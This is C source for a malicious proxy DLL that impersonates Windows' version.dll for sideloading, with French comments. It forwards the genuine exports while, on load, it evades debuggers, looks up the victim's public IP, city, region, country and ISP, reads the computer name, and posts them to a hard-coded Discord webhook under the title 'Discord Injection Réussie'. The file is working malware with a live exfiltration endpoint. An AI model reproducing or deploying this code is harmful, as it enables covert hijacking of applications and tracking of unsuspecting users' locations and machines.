#define WIN32_LEAN_AND_MEAN
#include <stdio.h>
#include <windows.h>
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")

typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PVOID Ldr;
    PVOID ProcessParameters;
    PVOID Reserved4[3];
    PVOID AtlThunkSListPtr;
    PVOID Reserved5;
    ULONG Reserved6;
    PVOID Reserved7;
    ULONG Reserved8;
    ULONG AtlThunkSListPtr32;
    PVOID Reserved9[45];
    BYTE Reserved10[96];
    PVOID PostProcessInitRoutine;
    BYTE Reserved11[128];
    PVOID Reserved12[1];
    ULONG SessionId;
    ULONG NtGlobalFlag;
} PEB, *PPEB;

typedef struct {
    char ip[32];
    char country[64];
    char city[64];
    char region[64];
    char isp[128];
} IpInfo;

static HMODULE g_hOrigDll = NULL;
static volatile LONG g_lExecuted = 0;

typedef DWORD (WINAPI *pfnGetFileVersionInfoSizeW)(LPCWSTR, LPDWORD);
typedef DWORD (WINAPI *pfnGetFileVersionInfoSizeA)(LPCSTR, LPDWORD);
typedef BOOL (WINAPI *pfnGetFileVersionInfoW)(LPCWSTR, DWORD, DWORD, LPVOID);
typedef BOOL (WINAPI *pfnGetFileVersionInfoA)(LPCSTR, DWORD, DWORD, LPVOID);
typedef BOOL (WINAPI *pfnVerQueryValueW)(LPCVOID, LPCWSTR, LPVOID*, PUINT);
typedef BOOL (WINAPI *pfnVerQueryValueA)(LPCVOID, LPCSTR, LPVOID*, PUINT);
typedef DWORD (WINAPI *pfnVerLanguageNameW)(DWORD, LPWSTR, DWORD);
typedef DWORD (WINAPI *pfnVerLanguageNameA)(DWORD, LPSTR, DWORD);

static pfnGetFileVersionInfoSizeW pGetFileVersionInfoSizeW = NULL;
static pfnGetFileVersionInfoSizeA pGetFileVersionInfoSizeA = NULL;
static pfnGetFileVersionInfoW pGetFileVersionInfoW = NULL;
static pfnGetFileVersionInfoA pGetFileVersionInfoA = NULL;
static pfnVerQueryValueW pVerQueryValueW = NULL;
static pfnVerQueryValueA pVerQueryValueA = NULL;
static pfnVerLanguageNameW pVerLanguageNameW = NULL;
static pfnVerLanguageNameA pVerLanguageNameA = NULL;

BOOL LoadSystemDll() {
    if (g_hOrigDll) return TRUE;

    if (IsDebuggerPresent()) {
        ExitProcess(0);
        return FALSE;
    }

    BOOL bDebuggerPresent = FALSE;
    if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebuggerPresent) && bDebuggerPresent) {
        ExitProcess(0);
        return FALSE;
    }

    PPEB pPeb = (PPEB)__readgsqword(0x60);
    if (pPeb && (pPeb->NtGlobalFlag & 0x70)) {
        ExitProcess(0);
        return FALSE;
    }

    wchar_t szPath[MAX_PATH];
    GetSystemDirectoryW(szPath, MAX_PATH);
    wcscat(szPath, L"\\version.dll");

    g_hOrigDll = LoadLibraryW(szPath);
    if (!g_hOrigDll) return FALSE;

    pGetFileVersionInfoSizeW = (pfnGetFileVersionInfoSizeW)GetProcAddress(g_hOrigDll, "GetFileVersionInfoSizeW");
    pGetFileVersionInfoSizeA = (pfnGetFileVersionInfoSizeA)GetProcAddress(g_hOrigDll, "GetFileVersionInfoSizeA");
    pGetFileVersionInfoW = (pfnGetFileVersionInfoW)GetProcAddress(g_hOrigDll, "GetFileVersionInfoW");
    pGetFileVersionInfoA = (pfnGetFileVersionInfoA)GetProcAddress(g_hOrigDll, "GetFileVersionInfoA");
    pVerQueryValueW = (pfnVerQueryValueW)GetProcAddress(g_hOrigDll, "VerQueryValueW");
    pVerQueryValueA = (pfnVerQueryValueA)GetProcAddress(g_hOrigDll, "VerQueryValueA");
    pVerLanguageNameW = (pfnVerLanguageNameW)GetProcAddress(g_hOrigDll, "VerLanguageNameW");
    pVerLanguageNameA = (pfnVerLanguageNameA)GetProcAddress(g_hOrigDll, "VerLanguageNameA");

    return TRUE;
}

__declspec(dllexport) DWORD WINAPI MyGetFileVersionInfoSizeW(LPCWSTR lpwstrFilename, LPDWORD lpdwHandle) {
    if (!LoadSystemDll() || !pGetFileVersionInfoSizeW) return 0;
    return pGetFileVersionInfoSizeW(lpwstrFilename, lpdwHandle);
}

__declspec(dllexport) DWORD WINAPI MyGetFileVersionInfoSizeA(LPCSTR lpstrFilename, LPDWORD lpdwHandle) {
    if (!LoadSystemDll() || !pGetFileVersionInfoSizeA) return 0;
    return pGetFileVersionInfoSizeA(lpstrFilename, lpdwHandle);
}

__declspec(dllexport) BOOL WINAPI MyGetFileVersionInfoW(LPCWSTR lpwstrFilename, DWORD dwHandle, DWORD dwLen, LPVOID lpData) {
    if (!LoadSystemDll() || !pGetFileVersionInfoW) return FALSE;
    return pGetFileVersionInfoW(lpwstrFilename, dwHandle, dwLen, lpData);
}

__declspec(dllexport) BOOL WINAPI MyGetFileVersionInfoA(LPCSTR lpstrFilename, DWORD dwHandle, DWORD dwLen, LPVOID lpData) {
    if (!LoadSystemDll() || !pGetFileVersionInfoA) return FALSE;
    return pGetFileVersionInfoA(lpstrFilename, dwHandle, dwLen, lpData);
}

__declspec(dllexport) BOOL WINAPI MyVerQueryValueW(LPCVOID pBlock, LPCWSTR lpwstrSubBlock, LPVOID *lplpBuffer, PUINT puLen) {
    if (!LoadSystemDll() || !pVerQueryValueW) return FALSE;
    return pVerQueryValueW(pBlock, lpwstrSubBlock, lplpBuffer, puLen);
}

__declspec(dllexport) BOOL WINAPI MyVerQueryValueA(LPCVOID pBlock, LPCSTR lpstrSubBlock, LPVOID *lplpBuffer, PUINT puLen) {
    if (!LoadSystemDll() || !pVerQueryValueA) return FALSE;
    return pVerQueryValueA(pBlock, lpstrSubBlock, lplpBuffer, puLen);
}

__declspec(dllexport) DWORD WINAPI MyVerLanguageNameW(DWORD wLang, LPWSTR szLang, DWORD cchLang) {
    if (!LoadSystemDll() || !pVerLanguageNameW) return 0;
    return pVerLanguageNameW(wLang, szLang, cchLang);
}

__declspec(dllexport) DWORD WINAPI MyVerLanguageNameA(DWORD wLang, LPSTR szLang, DWORD cchLang) {
    if (!LoadSystemDll() || !pVerLanguageNameA) return 0;
    return pVerLanguageNameA(wLang, szLang, cchLang);
}

BOOL GetIpInformation(IpInfo* info) {
    HINTERNET hSession, hConnect, hRequest;
    BOOL result = FALSE;
    DWORD bytesRead = 0;
    char buffer[2048] = {0};

    if (!info) return FALSE;

    // Initialiser la structure
    memset(info, 0, sizeof(IpInfo));

    hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return FALSE;

    hConnect = WinHttpConnect(hSession, L"ip-api.com", INTERNET_DEFAULT_HTTP_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/json/", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    if (WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0) && WinHttpReceiveResponse(hRequest, NULL)) {
        if (WinHttpReadData(hRequest, buffer, sizeof(buffer) - 1, &bytesRead)) {
            buffer[bytesRead] = '\0';

            // Parser les données JSON de façon simple
            char* ptr;

            // Extraire IP
            ptr = strstr(buffer, "\"query\":\"");
            if (ptr) {
                ptr += 9;
                char* end = strchr(ptr, '\"');
                if (end && (end - ptr) < sizeof(info->ip) - 1) {
                    strncpy(info->ip, ptr, end - ptr);
                }
            }

            // Extraire pays
            ptr = strstr(buffer, "\"country\":\"");
            if (ptr) {
                ptr += 11;
                char* end = strchr(ptr, '\"');
                if (end && (end - ptr) < sizeof(info->country) - 1) {
                    strncpy(info->country, ptr, end - ptr);
                }
            }

            // Extraire ville
            ptr = strstr(buffer, "\"city\":\"");
            if (ptr) {
                ptr += 8;
                char* end = strchr(ptr, '\"');
                if (end && (end - ptr) < sizeof(info->city) - 1) {
                    strncpy(info->city, ptr, end - ptr);
                }
            }

            // Extraire région
            ptr = strstr(buffer, "\"regionName\":\"");
            if (ptr) {
                ptr += 14;
                char* end = strchr(ptr, '\"');
                if (end && (end - ptr) < sizeof(info->region) - 1) {
                    strncpy(info->region, ptr, end - ptr);
                }
            }

            // Extraire ISP
            ptr = strstr(buffer, "\"isp\":\"");
            if (ptr) {
                ptr += 7;
                char* end = strchr(ptr, '\"');
                if (end && (end - ptr) < sizeof(info->isp) - 1) {
                    strncpy(info->isp, ptr, end - ptr);
                }
            }
            result = TRUE;
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return result;
}

void ExecuteWebhook() {
    HINTERNET hSession, hConnect, hRequest;
    IpInfo ipInfo;
    char computerName[256] = {0};
    DWORD nameSize = sizeof(computerName);
    char payload[2048];
    SYSTEMTIME st;

    GetSystemTime(&st);

    if (!GetComputerNameA(computerName, &nameSize)) {
        strcpy(computerName, "Inconnu");
    }

    if (!GetIpInformation(&ipInfo)) {
        strcpy(ipInfo.ip, "Inconnu");
        strcpy(ipInfo.country, "Inconnu");
        strcpy(ipInfo.city, "Inconnu");
        strcpy(ipInfo.region, "Inconnu");
        strcpy(ipInfo.isp, "Inconnu");
    }

    snprintf(payload, sizeof(payload),
        "{"
        "\"embeds\": ["
        "{"
        "\"title\": \"🚨 Discord Injection Réussie\","
        "\"color\": 16711680,"
        "\"fields\": ["
        "{"
        "\"name\": \"💻 Nom PC\","
        "\"value\": \"%s\","
        "\"inline\": true"
        "},"
        "{"
        "\"name\": \"🌐 IP Publique\","
        "\"value\": \"%s\","
        "\"inline\": true"
        "},"
        "{"
        "\"name\": \"🏙️ Ville\","
        "\"value\": \"%s\","
        "\"inline\": true"
        "},"
        "{"
        "\"name\": \"🌍 Pays\","
        "\"value\": \"%s\","
        "\"inline\": true"
        "},"
        "{"
        "\"name\": \"📍 Région\","
        "\"value\": \"%s\","
        "\"inline\": true"
        "},"
        "{"
        "\"name\": \"🌐 ISP\","
        "\"value\": \"%s\","
        "\"inline\": false"
        "}"
        "],"
        "\"timestamp\": \"%04d-%02d-%02dT%02d:%02d:%02d.000Z\""
        "}"
        "]"
        "}",
        computerName, ipInfo.ip, ipInfo.city, ipInfo.country, ipInfo.region, ipInfo.isp,
        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond
    );

    hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return;

    hConnect = WinHttpConnect(hSession, L"discord.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return;
    }

    hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/webhooks/1398781313250496542/BW9iVgC5NpwhqkLnpxEGA25iKEMd5GWiKNQrTt6qXDZAgasVRcjsPLHnCKxGaHD8fhjH", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return;
    }

    WinHttpSendRequest(hRequest, L"Content-Type: application/json\r\n", -1, (LPVOID)payload, (DWORD)strlen(payload), (DWORD)strlen(payload), 0);
    WinHttpReceiveResponse(hRequest, NULL);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

DWORD WINAPI PayloadThread(LPVOID lpParam) {
    Sleep(1000);
    ExecuteWebhook();
    ExitThread(0);
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        if (InterlockedIncrement(&g_lExecuted) != 1) return TRUE;

        DisableThreadLibraryCalls(hinstDLL);
        LoadSystemDll();
        CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
    }
    else if (fdwReason == DLL_PROCESS_DETACH) {
        if (g_hOrigDll) {
            FreeLibrary(g_hOrigDll);
            g_hOrigDll = NULL;
        }
    }
    return TRUE;
}
